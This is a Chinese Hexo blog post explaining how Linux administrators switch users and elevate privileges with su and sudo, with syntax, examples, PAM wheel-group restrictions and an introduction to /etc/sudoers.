<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>提权 | Hexo</title><meta name="keywords" content="linux"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="提权"><meta name="application-name" content="提权"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="提权"><meta property="og:url" content="http://example.com/2025/07/29/%E6%8F%90%E6%9D%83/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="永久提权 su （Switch User）是 Linux&amp;#x2F;Unix 系统中用于切换用户身份的核心命令，常用于临时获取目标用户的权限（尤其是 root 用户）。  1.基本语法1su [选项] [用户名]  12345#若不指定用户名，默认切换到 root 用户。#常用选项：- 或 -l ："><meta property="og:locale" content="en"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="John Doe"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="永久提权 su （Switch User）是 Linux&amp;#x2F;Unix 系统中用于切换用户身份的核心命令，常用于临时获取目标用户的权限（尤其是 root 用户）。  1.基本语法1su [选项] [用户名]  12345#若不指定用户名，默认切换到 root 用户。#常用选项：- 或 -l ："><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2025/07/29/%E6%8F%90%E6%9D%83/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  music_page_default: "nav_music",
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: undefined,
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"Author: John Doe","link":"Link: ","source":"Source: Hexo","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'Hexo',
  title: '提权',
  postAI: '',
  pageFillDescription: '永久提权, 1.基本语法, 2.核心功能与示例, 2.1切换到root用户, 2.1.1安全注意事项, 密码暴露风险：, 禁用 root登录：, 2.1.2常见问题解答, 如何退出su切换的用户？, 切换用户后环境变量错误？, 普通用户无法切换到 root？, 2.2切换到其他用户, 2.3执行单条命令后退出, 2.4 实际应用场景, 系统维护, 脚本中临时提权, 临时提权, 1.核心特性, 2.基本语法, 3.工作流程, 4.配置文件 x2Fetcx2Fsudoers, 4.1配置语法, 4.2示例, 4.3实验示例, 使一个新用户user777具有删除test用户的权限, 方法一：将新用户加入wheel组, 方法二：编辑x2Fetcx2Fsudoers 添加特权, 5. 实际应用场景：, 5.1 普通用户执行特权命令, 5.2 以其他用户身份执行命令, 5.3 进入特权Shell环境, 5.4 查看用户权限, 6.安全最佳实践, （1）最小权限原则：, （2）禁用密码（谨慎使用）：, （3）日志监控：, （4） 超时配置：, （5）禁用 root 登录：, 7.常见问题解决, 7.1 用户无法使用 sudo, 7.2 命令路径不匹配, 7.3 避免语法错误, 8. 高级用法, 8.1 限制命令参数, 9. 总结, （1）对比： sudo vs su, （2）危害比较大的命令永久提权是系统中用于切换用户身份的核心命令常用于临时获取目标用户的权限尤其是用户基本语法选项用户名若不指定用户名默认切换到用户常用选项或模拟完整登录加载目标用户的环境变量命令以目标用户身份执行单条命令后退出指定如核心功能与示例切换到用户完整登录加载环境变量推荐等效于仅切换用户身份环境变量不变安全注意事项密码暴露风险需要输入目标用户的密码若多人共用密码难以审计操作来源推荐替代方案使用实现权限最小化和操作审计禁用登录在安全要求高的场景可通过以下方式禁用的切换编辑仅允许组成员使用常见问题解答如何退出切换的用户输入或按退回原用户切换用户后环境变量错误使用而非确保加载完整环境普通用户无法切换到可能原因密码错误用户被禁用如中设为策略限制如仅允许特定用户组使用切换到其他用户切换到用户需的密码但由用户切换则不需要密码仅切换身份不加载环境变量执行单条命令后退出确认用户是否存在并有效实际应用场景系统维护以身份更新系统脚本中临时提权以身份创建目录临时提权是系统中用于临时以特权身份如执行命令的核心工具相比更安全且支持细粒度权限控制以下是其核心概念配置及实际应用指南核心特性无需共享密码验证当前用户密码而非目标用户如密码最小权限原则可限制用户仅能执行特定命令操作审计所有操作记录在或超时机制默认分钟内无需重复输入密码可配置基本语法选项命令用户以指定用户身份执行默认模拟完整登录加载目标用户环境变量启动目标用户的列出当前用户允许执行的命令工作流程权限检查系统读取文件验证用户是否有权执行该命令密码验证输入当前用户密码若未配置命令执行以目标用户身份执行命令完成后权限自动回收配置文件安全编辑方式配置语法用户组主机可切换身份可执行的命令参数用户组开头表示组如主机表示所有主机可切换身份表示任意用户可指定为命令需使用绝对路径如示例允许组成员以身份执行所有命令允许用户无需密码重启允许用户在特定主机上管理用户实验示例使一个新用户具有删除用户的权限方法一将新用户加入组添加新用户尝试使用提权切换用户使用命令删除用户使用提权尝试删除用户没有权限使用只有在中的用户才可以组未找到用户已被删除方法二编辑添加特权新建用户重复方法一中的操作发现无法删除编辑文件将用户添加特权编辑前先将文件进行备份的密码并不属于所以不会删除原因可能是该文件被其他用户或进程占用或权限被手动修改过并不属于所以不会删除原因可能是目录所有权被更改或残留数据未清理说明并未完全删除彻底解决方法检查并删除邮件目录确认所有权后手动删除检查并删除家目录确认无重要数据后删除重新执行删除成功删除实际应用场景普通用户执行特权命令更新软件包列表查看系统日志需权限以其他用户身份执行命令以用户身份启动进程进入特权环境切换到的完整环境加载变量启动的保持当前目录查看用户权限列出当前用户可执行的命令安全最佳实践最小权限原则避免赋予权限按需授权特定命令例如在配置中允许以权限执行和而无需输入密码禁用密码谨慎使用允许用户无需密码执行命令日志监控检查或追踪可疑操作超时配置修改默认超时时间单位分钟修改分钟后需重新输入密码验证显示会话剩余时间如果返回需要密码说明超时已生效禁用登录结合使用增强安全性禁用登录常见问题解决用户无法使用原因用户未在中配置解决使用用户添加规则将用户加入组需组已授权或直接编辑命令路径不匹配错误解决在规则中指定命令的绝对路径避免语法错误风险直接编辑可能导致配置失效解决始终使用命令自动检查语法高级用法限制命令参数允许仅能添加用户禁止删除限制用户命名规则防止恶意破坏可能存在的恶意破坏例如命令注入攻击总结对比通过合理配置可以在保障系统安全的前提下高效完成日常管理任务始终遵循最小权限原则并定期审计权限分配危害比较大的命令删除跑路文件系统删除远程代码执行下载并执行恶意脚本恶意网址恶意网址反弹常见变种后门恶意公钥应立即隔离断开网络取证分析从干净介质重装系统',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-08-08 12:13:28',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Hexo</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/linux/" style="font-size: 1.05rem;">linux<sup>9</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">July 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/linux/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>linux</span></a></span></div></div><h1 class="post-title" itemprop="name headline">提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-07-29T08:17:51.000Z" title="Created 2025-07-29 16:17:51">2025-07-29</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-08-08T04:13:28.996Z" title="Updated 2025-08-08 12:13:28">2025-08-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2025/07/29/%E6%8F%90%E6%9D%83/"><header><a href="/tags/linux/" tabindex="-1" itemprop="url">linux</a><h1 id="CrawlerTitle" itemprop="name headline">提权</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">John Doe</span><time itemprop="dateCreated datePublished" datetime="2025-07-29T08:17:51.000Z" title="Created 2025-07-29 16:17:51">2025-07-29</time><time itemprop="dateCreated datePublished" datetime="2025-08-08T04:13:28.996Z" title="Updated 2025-08-08 12:13:28">2025-08-08</time></header><h2 id="永久提权"><a href="#永久提权" class="headerlink" title="永久提权"></a>永久提权</h2><blockquote>
<p>su （Switch User）是 Linux&#x2F;Unix 系统中用于切换用户身份的核心命令，常用于临时获取目标用户的权限（尤其是 root 用户）。</p>
</blockquote>
<h3 id="1-基本语法"><a href="#1-基本语法" class="headerlink" title="1.基本语法"></a>1.基本语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su [选项] [用户名]</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#若不指定用户名，默认切换到 root 用户。</span></span><br><span class="line"><span class="comment">#常用选项：</span></span><br><span class="line">- 或 -l ：模拟完整登录（加载目标用户的环境变量）。</span><br><span class="line">-c <span class="string">&quot;命令&quot;</span> ：以目标用户身份执行单条命令后退出。</span><br><span class="line">-s ：指定 Shell（如 -s /bin/bash ）。</span><br></pre></td></tr></table></figure>

<h3 id="2-核心功能与示例"><a href="#2-核心功能与示例" class="headerlink" title="2.核心功能与示例"></a>2.核心功能与示例</h3><h4 id="2-1切换到root用户"><a href="#2-1切换到root用户" class="headerlink" title="2.1切换到root用户"></a>2.1切换到root用户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - root <span class="comment"># 完整登录，加载 root 环境变量（推荐）等效于su - </span></span><br><span class="line">su root <span class="comment"># 仅切换用户身份，环境变量不变 </span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\15078\AppData\Roaming\Typora\typora-user-images\image-20250801101941892.png" alt="image-20250801101941892"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/seventeen526/picgo/main/img/image-20250801102207005.png" alt="image-20250801102207005"></p>
<h5 id="2-1-1安全注意事项"><a href="#2-1-1安全注意事项" class="headerlink" title="2.1.1安全注意事项"></a>2.1.1安全注意事项</h5><h6 id="密码暴露风险："><a href="#密码暴露风险：" class="headerlink" title="密码暴露风险："></a>密码暴露风险：</h6><p>​     su 需要输入目标用户的密码，若多人共用 root 密码，难以审计操作来源。</p>
<p>推荐替代方案：使用 sudo 实现权限最小化和操作审计。</p>
<h6 id="禁用-root登录："><a href="#禁用-root登录：" class="headerlink" title="禁用 root登录："></a><strong>禁用</strong> root登录：</h6><p>在安全要求高的场景，可通过以下方式禁用 root 的 su 切换：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑 /etc/pam.d/su </span></span><br><span class="line">auth required pam_wheel.so use_uid </span><br><span class="line"><span class="comment"># 仅允许 wheel 组成员使用 su</span></span><br></pre></td></tr></table></figure>

<h5 id="2-1-2常见问题解答"><a href="#2-1-2常见问题解答" class="headerlink" title="2.1.2常见问题解答"></a>2.1.2常见问题解答</h5><h6 id="如何退出su切换的用户？"><a href="#如何退出su切换的用户？" class="headerlink" title="如何退出su切换的用户？"></a>如何退出su切换的用户？</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入 <span class="built_in">exit</span> 或按 Ctrl+D 退回原用户。</span><br></pre></td></tr></table></figure>

<h6 id="切换用户后环境变量错误？"><a href="#切换用户后环境变量错误？" class="headerlink" title="切换用户后环境变量错误？"></a>切换用户后环境变量错误？</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 su - 而非 su ，确保加载完整环境。</span><br></pre></td></tr></table></figure>

<h6 id="普通用户无法切换到-root？"><a href="#普通用户无法切换到-root？" class="headerlink" title="普通用户无法切换到 root？"></a>普通用户无法切换到 root？</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#可能原因：</span></span><br><span class="line">（1）root 密码错误。</span><br><span class="line">（2）root 用户被禁用（如 /etc/passwd 中 Shell 设为 /sbin/nologin ）。</span><br><span class="line">（3）PAM 策略限制（如仅允许特定用户组使用 su ）</span><br></pre></td></tr></table></figure>

<h4 id="2-2切换到其他用户"><a href="#2-2切换到其他用户" class="headerlink" title="2.2切换到其他用户"></a>2.2切换到其他用户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - alice <span class="comment"># 切换到 alice 用户（需 alice 的密码），但由root用户切换则不需要密码</span></span><br><span class="line">su alice <span class="comment"># 仅切换身份，不加载环境变量</span></span><br></pre></td></tr></table></figure>

<h4 id="2-3执行单条命令后退出"><a href="#2-3执行单条命令后退出" class="headerlink" title="2.3执行单条命令后退出"></a>2.3执行单条命令后退出</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@<span class="built_in">test</span> admin]#  su - user01 -c <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="comment">#确认用户是否存在并有效。</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/seventeen526/picgo/main/img/image-20250801102659263.png" alt="image-20250801102659263"></p>
<h4 id="2-4-实际应用场景"><a href="#2-4-实际应用场景" class="headerlink" title="2.4 实际应用场景"></a>2.4 实际应用场景</h4><h5 id="系统维护"><a href="#系统维护" class="headerlink" title="系统维护"></a>系统维护</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - root -c <span class="string">&quot;apt upgrade &amp;&amp; apt autoremove&quot;</span> </span><br><span class="line"><span class="comment"># 以 root 身份更新系统</span></span><br></pre></td></tr></table></figure>

<h5 id="脚本中临时提权"><a href="#脚本中临时提权" class="headerlink" title="脚本中临时提权"></a>脚本中临时提权</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/bin/bash </span></span><br><span class="line"><span class="comment"># 以 root 身份创建目录 </span></span><br><span class="line">su - root -c <span class="string">&quot;mkdir /opt/custom_app&quot;</span> </span><br><span class="line"><span class="built_in">chown</span> user:user /opt/custom_app</span><br></pre></td></tr></table></figure>



<h2 id="临时提权"><a href="#临时提权" class="headerlink" title="临时提权"></a>临时提权</h2><blockquote>
<p> sudo （Super User Do）是 Linux&#x2F;Unix 系统中用于临时以特权身份（如 root ）执行命令的核心工具，相比 su 更安全且支持细粒度权限控制。以下是其核心概念、配置及实际应用指南。</p>
</blockquote>
<h3 id="1-核心特性"><a href="#1-核心特性" class="headerlink" title="1.核心特性"></a>1.核心特性</h3><p><strong>无需共享密码</strong>：验证当前用户密码，而非目标用户（如 root ）密码。</p>
<p><strong>最小权限原则</strong>：可限制用户仅能执行特定命令。</p>
<p><strong>操作审计</strong>：所有 sudo 操作记录在 &#x2F;var&#x2F;log&#x2F;auth.log 或 &#x2F;var&#x2F;log&#x2F;secure 。</p>
<p><strong>超时机制</strong>：默认 15 分钟内无需重复输入密码（可配置）。</p>
<h3 id="2-基本语法"><a href="#2-基本语法" class="headerlink" title="2.基本语法"></a>2.基本语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> [选项] 命令</span><br><span class="line"><span class="comment">#-u 用户 ：以指定用户身份执行（默认 root ）。</span></span><br><span class="line"><span class="comment">#-i ：模拟完整登录（加载目标用户环境变量）。</span></span><br><span class="line"><span class="comment">#-s ：启动目标用户的 Shell。</span></span><br><span class="line"><span class="comment">#-l ：列出当前用户允许执行的命令。</span></span><br></pre></td></tr></table></figure>

<h3 id="3-工作流程"><a href="#3-工作流程" class="headerlink" title="3.工作流程"></a>3.工作流程</h3><p>（1）<strong>权限检查</strong>：</p>
<p>系统读取 &#x2F;etc&#x2F;sudoers 文件，验证用户是否有权执行该命令。</p>
<p>（2）<strong>密码验证</strong>：</p>
<p>输入当前用户密码（若未配置 NOPASSWD ）。</p>
<p>（3）<strong>命令执行</strong>：</p>
<p>以目标用户身份执行命令，完成后权限自动回收。</p>
<h3 id="4-配置文件-etc-sudoers"><a href="#4-配置文件-etc-sudoers" class="headerlink" title="4.配置文件 &#x2F;etc&#x2F;sudoers"></a>4.配置文件 &#x2F;etc&#x2F;sudoers</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">visudo <span class="comment"># 安全编辑方式</span></span><br></pre></td></tr></table></figure>

